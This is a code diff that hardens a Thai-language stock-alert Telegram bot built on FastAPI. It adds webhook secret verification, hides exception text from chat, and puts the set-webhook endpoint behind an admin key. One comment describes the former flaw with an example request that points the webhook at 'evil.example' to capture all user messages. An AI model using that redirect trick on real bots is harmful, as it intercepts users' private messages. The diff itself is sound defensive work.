@@ -1,6 +1,7 @@
 from __future__ import annotations
 
 import asyncio
+import hmac
 import logging
 import os
 import re
@@ -66,6 +67,57 @@ _BOT_COMMAND_MENU = [
 ]
 
 
+# งานพื้นหลังต้องถูกอ้างอิงไว้ ไม่งั้น event loop เก็บแค่ weak reference แล้ว GC
+# อาจเก็บ task กลางคัน — อาการคือบอทเงียบเป็นครั้งคราวโดยไม่มี error ใน log
+_BACKGROUND_TASKS: set[asyncio.Task] = set()
+
+
+def _spawn(coro) -> asyncio.Task:
+    task = asyncio.create_task(coro)
+    _BACKGROUND_TASKS.add(task)
+    task.add_done_callback(_BACKGROUND_TASKS.discard)
+    return task
+
+
+def telegram_webhook_secret() -> str:
+    """secret_token สำหรับ webhook — derive จาก bot token จึงไม่ต้องตั้ง env var เพิ่ม.
+
+    Telegram จะส่งค่านี้กลับมาใน header X-Telegram-Bot-Api-Secret-Token ทุกครั้ง
+    ใช้พิสูจน์ว่า update มาจาก Telegram จริง ไม่ใช่คนที่เดา URL เจอ
+    """
+    import hashlib
+
+    settings = get_settings()
+    if not settings.telegram_bot_token:
+        return ""
+    return hashlib.sha256(f"webhook:{settings.telegram_bot_token}".encode()).hexdigest()
+
+
+async def _register_telegram_webhook(render_url: str) -> None:
+    """ลงทะเบียน webhook + เมนูคำสั่งกับ Telegram และ log ผลจริงที่ตอบกลับมา."""
+    import httpx
+
+    settings = get_settings()
+    async with httpx.AsyncClient(timeout=10) as client:
+        response = await client.post(
+            f"https://api.telegram.org/bot{settings.telegram_bot_token}/setWebhook",
+            json={
+                "url": f"{render_url}/telegram/webhook",
+                "secret_token": telegram_webhook_secret(),
+            },
+        )
+        # ของเดิมทิ้ง response ทั้งก้อน ทำให้การลงทะเบียนล้มเหลวแบบเงียบ ๆ มองไม่เห็นเลย
+        body = response.json()
+        if body.get("ok"):
+            logger.info("Telegram webhook registered: %s/telegram/webhook", render_url)
+        else:
+            logger.error("Telegram setWebhook rejected: %s", body)
+        await client.post(
+            f"https://api.telegram.org/bot{settings.telegram_bot_token}/setMyCommands",
+            json={"commands": _BOT_COMMAND_MENU},
+        )
+
+
 async def _on_startup() -> None:
     """ส่ง deploy notification + digest เข้า Telegram และลงทะเบียน webhook อัตโนมัติ."""
     await asyncio.sleep(5)  # รอให้ server boot เสร็จก่อน
@@ -77,18 +129,7 @@ async def _on_startup() -> None:
     render_url = os.getenv("RENDER_EXTERNAL_URL", "").rstrip("/")
     if render_url and settings.telegram_bot_token:
         try:
-            import httpx
-            async with httpx.AsyncClient(timeout=10) as client:
-                await client.post(
-                    f"https://api.telegram.org/bot{settings.telegram_bot_token}/setWebhook",
-                    json={"url": f"{render_url}/telegram/webhook"},
-                )
-                # ลงทะเบียนเมนูคำสั่งให้ Telegram ขึ้น autocomplete ให้ผู้ใช้
-                await client.post(
-                    f"https://api.telegram.org/bot{settings.telegram_bot_token}/setMyCommands",
-                    json={"commands": _BOT_COMMAND_MENU},
-                )
-            logger.info("Telegram webhook registered: %s/telegram/webhook", render_url)
+            await _register_telegram_webhook(render_url)
         except Exception as exc:
             logger.warning("webhook registration failed: %s", exc)
 
@@ -108,7 +149,7 @@ async def _on_startup() -> None:
                     logger.warning("price alert loop error: %s", exc)
                 await asyncio.sleep(interval)
 
-        asyncio.create_task(_alert_loop())
+        _spawn(_alert_loop())
 
     # อุ่น cache "หุ้นน่าสนใจวันนี้" ไว้ล่วงหน้า — คำนวณสดใช้เวลา ~1 นาที
     # ถ้าไม่อุ่นไว้ ผู้เข้าชมคนแรกหลัง deploy จะต้องรอทั้งก้อน
@@ -122,7 +163,7 @@ async def _on_startup() -> None:
             except Exception as exc:
                 logger.warning("daily picks warm-up failed: %s", exc)
 
-        asyncio.create_task(_warm_picks())
+        _spawn(_warm_picks())
 
         # อุ่นชุดหุ้นซิ่ง/ระยะยาวไปพร้อมกัน — ทั้งสองหน้าเคยต้องรอสแกนสด 35-66 วินาที
         # ตอนมีคนเปิดหน้าครั้งแรก
@@ -137,7 +178,7 @@ async def _on_startup() -> None:
             await asyncio.sleep(45)  # เว้นระยะไม่ให้ยิง provider พร้อมกันจนโดน rate limit
             start_background_refresh("longterm", lambda: _longterm_pool(force=True))
 
-        asyncio.create_task(_warm_pools())
+        _spawn(_warm_pools())
 
     if settings.app_env != "production" or not settings.send_telegram:
         return
@@ -189,7 +230,7 @@ async def lifespan(app: FastAPI):
         from workers.repository import fail_stale_scan_runs
 
         fail_stale_scan_runs(settings.database_url, older_than_minutes=0)
-    asyncio.create_task(_on_startup())
+    _spawn(_on_startup())
     yield
 
 
@@ -1277,26 +1318,37 @@ async def _handle_bot_command(command: str, chat_id: str, chat_type: str = "priv
                 chat_id=chat_id,
             )
     except Exception as exc:
+        # ห้ามส่ง str(exc) เข้าแชท — error ของ psycopg/httpx มักมี connection string
+        # หรือ URL ที่ฝังรหัสผ่าน/โทเคนไว้ ผู้ใช้ปลายทางไม่ควรเห็นและไม่ได้ช่วยอะไร
         logger.exception("bot command failed: %s", exc)
         try:
-            await telegram.send_message(f"⚠️ เกิดข้อผิดพลาด: {exc}", chat_id=chat_id)
+            await telegram.send_message(
+                "⚠️ เกิดข้อผิดพลาดระหว่างประมวลผล ลองใหม่อีกครั้ง หรือพิมพ์ /help",
+                chat_id=chat_id,
+            )
         except Exception:
             pass
 
 
 @app.post("/telegram/webhook")
-async def telegram_webhook(update: dict) -> dict:
+async def telegram_webhook(
+    update: dict,
+    x_telegram_bot_api_secret_token: Optional[str] = Header(default=None),
+) -> dict:
     """Telegram Bot API webhook — รับ message จากผู้ใช้แล้วตอบกลับ.
 
-    ตั้งค่า:
-      curl -X POST "https://api.telegram.org/bot<TOKEN>/setWebhook" \\
-           -d "url=https://ai-stock-e6ks.vercel.app/telegram/webhook"
+    URL นี้เปิดสาธารณะ จึงต้องพิสูจน์ว่า update มาจาก Telegram จริงด้วย secret token
+    ที่ลงทะเบียนไว้ตอน setWebhook ไม่งั้นใครเดา URL เจอก็สั่งบอทส่งข้อความหา chat ใดก็ได้
     """
-    import asyncio
+    expected_secret = telegram_webhook_secret()
+    if expected_secret:
+        provided = x_telegram_bot_api_secret_token or ""
+        if not hmac.compare_digest(provided, expected_secret):
+            raise HTTPException(status_code=403, detail="Invalid webhook secret")
 
     callback = update.get("callback_query")
     if callback:
-        asyncio.create_task(_handle_callback(callback))
+        _spawn(_handle_callback(callback))
         return {"ok": True}
 
     message = update.get("message") or update.get("edited_message")
@@ -1312,32 +1364,21 @@ async def telegram_webhook(update: dict) -> dict:
 
     # fire-and-forget: ตอบ Telegram 200 ทันที ไม่ให้ webhook timeout แล้ว retry
     # (การ scan ใช้เวลานาน บอทจะส่งข้อความกลับเองผ่าน chat_id เมื่อเสร็จ)
-    asyncio.create_task(
-        _handle_bot_command(text, chat_id, str(chat.get("type") or "private"))
-    )
+    _spawn(_handle_bot_command(text, chat_id, str(chat.get("type") or "private")))
     return {"ok": True}
 
 
-@app.get("/telegram/set-webhook")
-async def telegram_set_webhook(url: Optional[str] = None) -> dict:
-    """ตั้ง webhook ให้บอท (เรียกครั้งเดียวหลัง deploy)."""
-    import httpx
+@app.post("/telegram/set-webhook")
+async def telegram_set_webhook(_: None = Depends(require_admin_api_key)) -> dict:
+    """ตั้ง webhook ให้บอทชี้กลับมาที่ service นี้ (เรียกเองเมื่อ auto-register ล้มเหลว).
 
-    from workers.config import get_settings
-
+    ไม่รับ URL จากผู้เรียกอีกต่อไป — ของเดิมเป็น GET ที่ใครก็ได้ยิง
+    ?url=https://evil.example/hook เพื่อเปลี่ยนปลายทาง webhook แล้วดูดข้อความผู้ใช้ทั้งหมด
+    """
     settings = get_settings()
     if not settings.telegram_bot_token:
         return {"status": "no_token"}
 
-    # default = service ที่กำลังรันอยู่จริง (Render inject RENDER_EXTERNAL_URL ให้)
-    # ของเดิม hardcode URL Vercel เก่าไว้ ทำให้เผลอชี้ webhook ไป service ที่ตายแล้ว
     render_url = os.getenv("RENDER_EXTERNAL_URL", "https://ai-stock-01or.onrender.com").rstrip("/")
-    target_url = url or f"{render_url}/telegram/webhook"
-    api_url = f"https://api.telegram.org/bot{settings.telegram_bot_token}/setWebhook"
-    async with httpx.AsyncClient(timeout=20) as client:
-        resp = await client.post(api_url, json={"url": target_url})
-        await client.post(
-            f"https://api.telegram.org/bot{settings.telegram_bot_token}/setMyCommands",
-            json={"commands": _BOT_COMMAND_MENU},
-        )
-        return {"status": "set", "url": target_url, "telegram_response": resp.json()}
+    await _register_telegram_webhook(render_url)
+    return {"status": "set", "url": f"{render_url}/telegram/webhook"}
